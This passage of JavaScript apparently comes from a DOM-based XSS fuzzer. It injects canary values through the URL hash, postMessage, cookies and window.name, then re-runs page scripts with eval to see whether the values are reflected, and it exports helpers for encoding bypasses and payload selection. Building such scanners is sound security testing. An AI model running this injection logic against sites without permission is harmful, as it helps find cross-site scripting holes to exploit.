          const origWln = hasDocWrite ? document.writeln : null;
          if (hasDocWrite) {
            scriptsWithDocWrite++;
            const mc = _getMockContainer();
            document.write = function (markup) { docWriteCalls++; mc.insertAdjacentHTML('beforeend', markup); };
            document.writeln = function (markup) { docWriteCalls++; mc.insertAdjacentHTML('beforeend', markup + '\n'); };
          }
          try {
            const unwrapped = _unwrapCode(code);
            if (unwrapped !== code) {
              try { (0, eval)(unwrapped); } catch (e) { ns.log.debug(` ${label} eval error (unwrapped): ${e.message}`); }
            } else {
              try { (0, eval)(code); } catch (e) { ns.log.debug(` ${label} eval error: ${e.message}`); }
            }
          } catch (e) { ns.log.debug(` ${label} processing error: ${e.message}`); }
          if (hasDocWrite) {
            document.write = origW;
            document.writeln = origWln;
          }
        }

        const LOC_RE = /location\.|URLSearchParams|searchParams|\.search\b|\.hash\b|\.get\s*\(/;

        // A. Re-evaluate INLINE scripts that reference location
        try {
          document.querySelectorAll('script:not([src])').forEach(sc => {
            const code = sc.textContent || '';
            if (code.length > 10000) return;
            if (!LOC_RE.test(code)) return;
            scriptsMatched++;
            _evalWithMock(code, 'inline');
          });
        } catch (e) { ns.log.debug(e.message); }

        // B. Re-evaluate EXTERNAL scripts that reference location (pre-cached)
        if (_extScriptCache && _extScriptCache.size > 0) {
          for (const [src, code] of _extScriptCache) {
            scriptsMatched++;
            _evalWithMock(code, `external(${src.split('/').pop()})`);
          }
        }

        try { document.dispatchEvent(new Event('DOMContentLoaded', { bubbles: true })); } catch (e) { ns.log.debug(e.message); }
        try { window.dispatchEvent(new Event('load')); } catch (e) { ns.log.debug(e.message); }
        ns.log.debug(` scripts: ${scriptsMatched} matched (${scriptsWithDocWrite} doc.write), write() calls: ${docWriteCalls}`);
        break;
      }
      case 'hash': {
        location.hash = value;
        window.dispatchEvent(new HashChangeEvent('hashchange'));
        const prevCaptureHash = document.getElementById('__domxss_docwrite_capture');
        if (prevCaptureHash) prevCaptureHash.innerHTML = '';
        let hashScriptsMatched = 0;
        let hashDocWriteCalls = 0;

        function _getHashMockContainer() {
          let mc = document.getElementById('__domxss_docwrite_capture');
          if (!mc) {
            mc = document.createElement('div');
            mc.id = '__domxss_docwrite_capture';
            mc.style.cssText = 'position:fixed;left:-9999px;top:-9999px;width:1px;height:1px;overflow:hidden;opacity:0;pointer-events:none';
            document.body.appendChild(mc);
          }
          return mc;
        }

        const HASH_LOC_RE = /location\.|\.hash\b|\.search\b|URLSearchParams/;

        // A. Inline scripts
        try {
          document.querySelectorAll('script:not([src])').forEach(sc => {
            const code = sc.textContent || '';
            if (code.length > 10000) return;
            if (!HASH_LOC_RE.test(code)) return;
            hashScriptsMatched++;
            const hasDocWrite = /\bdocument\.write(?:ln)?\s*\(/.test(code);
            const origW = hasDocWrite ? document.write : null;
            const origWln = hasDocWrite ? document.writeln : null;
            if (hasDocWrite) {
              const mc = _getHashMockContainer();
              document.write = function (markup) { hashDocWriteCalls++; mc.insertAdjacentHTML('beforeend', markup); };
              document.writeln = function (markup) { hashDocWriteCalls++; mc.insertAdjacentHTML('beforeend', markup + '\n'); };
            }
            try {
              let unwrapped = code;
              unwrapped = unwrapped.replace(/document\.addEventListener\s*\(\s*['"]DOMContentLoaded['"]\s*,\s*function\s*\([^)]*\)\s*\{/gi, '(function(){');
              unwrapped = unwrapped.replace(/window\.addEventListener\s*\(\s*['"]load['"]\s*,\s*function\s*\([^)]*\)\s*\{/gi, '(function(){');
              unwrapped = unwrapped.replace(/window\.onload\s*=\s*function\s*\([^)]*\)\s*\{/gi, '(function(){');
              if (unwrapped !== code) {
                try { (0, eval)(unwrapped); } catch (e) { ns.log.debug(e.message); }
              } else {
                try { (0, eval)(code); } catch (e) { ns.log.debug(e.message); }
              }
            } catch (e) { ns.log.debug(e.message); }
            if (hasDocWrite) { document.write = origW; document.writeln = origWln; }
          });
        } catch (e) { ns.log.debug(e.message); }

        // B. External scripts (pre-cached)
        if (_extScriptCache && _extScriptCache.size > 0) {
          for (const [src, code] of _extScriptCache) {
            if (!HASH_LOC_RE.test(code)) continue;
            hashScriptsMatched++;
            const hasDocWrite = /\bdocument\.write(?:ln)?\s*\(/.test(code);
            const origW = hasDocWrite ? document.write : null;
            const origWln = hasDocWrite ? document.writeln : null;
            if (hasDocWrite) {
              const mc = _getHashMockContainer();
              document.write = function (markup) { hashDocWriteCalls++; mc.insertAdjacentHTML('beforeend', markup); };
              document.writeln = function (markup) { hashDocWriteCalls++; mc.insertAdjacentHTML('beforeend', markup + '\n'); };
            }
            try { (0, eval)(code); } catch (e) { ns.log.debug(e.message); }
            if (hasDocWrite) { document.write = origW; document.writeln = origWln; }
          }
        }

        try { document.dispatchEvent(new Event('DOMContentLoaded', { bubbles: true })); } catch (e) { ns.log.debug(e.message); }
        try { window.dispatchEvent(new Event('load')); } catch (e) { ns.log.debug(e.message); }
        if (hashScriptsMatched > 0) {
          ns.log.debug(` hash: ${hashScriptsMatched} scripts, write() calls: ${hashDocWriteCalls}`);
        }
        break;
      }
      case 'postmessage': {
        window.postMessage(value, '*');
        document.querySelectorAll('iframe').forEach(f => {
          try { f.contentWindow.postMessage(value, '*'); } catch (e) { ns.log.debug(e.message); }
        });
        break;
      }
      case 'cookie': {
        // Inject canary into a test cookie; page JS reading document.cookie may reflect it
        document.cookie = `__domxss_test=${value}; path=/; SameSite=Lax`;
        // Re-evaluate scripts that read document.cookie
        const COOKIE_RE = /document\.cookie|\.cookie\b/;
        try {
          document.querySelectorAll('script:not([src])').forEach(sc => {
            const code = sc.textContent || '';
            if (code.length > 10000) return;
            if (!COOKIE_RE.test(code)) return;
            try { (0, eval)(code); } catch (e) { ns.log.debug(e.message); }
          });
        } catch (e) { ns.log.debug(e.message); }
        if (_extScriptCache && _extScriptCache.size > 0) {
          for (const [, code] of _extScriptCache) {
            if (!COOKIE_RE.test(code)) continue;
            try { (0, eval)(code); } catch (e) { ns.log.debug(e.message); }
          }
        }
        break;
      }
      case 'window-name': {
        // Set window.name — cross-origin data channel used by some apps
        window.name = value;
        // Re-evaluate scripts that reference window.name
        const WNAME_RE = /window\.name\b/;
        try {
          document.querySelectorAll('script:not([src])').forEach(sc => {
            const code = sc.textContent || '';
            if (code.length > 10000) return;
            if (!WNAME_RE.test(code)) return;
            try { (0, eval)(code); } catch (e) { ns.log.debug(e.message); }
          });
        } catch (e) { ns.log.debug(e.message); }
        if (_extScriptCache && _extScriptCache.size > 0) {
          for (const [, code] of _extScriptCache) {
            if (!WNAME_RE.test(code)) continue;
            try { (0, eval)(code); } catch (e) { ns.log.debug(e.message); }
          }
        }
        break;
      }
      case 'referrer': {
        // Referrer is read-only — no injection, just detection via Phase 2 reflection scan
        break;
      }
    }
    await new Promise(r => setTimeout(r, delayMs));
  }

  ns.fuzzerHelpers = {
    generateEncodingBypasses,
    prioritizeBypasses,
    resolveRealPayload,
    isPayloadReflected,
    getFillerValue,
    getCanaryValue,
    selectVerifyPayloads,
    discoverParamsFromSource,
    injectAndWait,
  };
})();
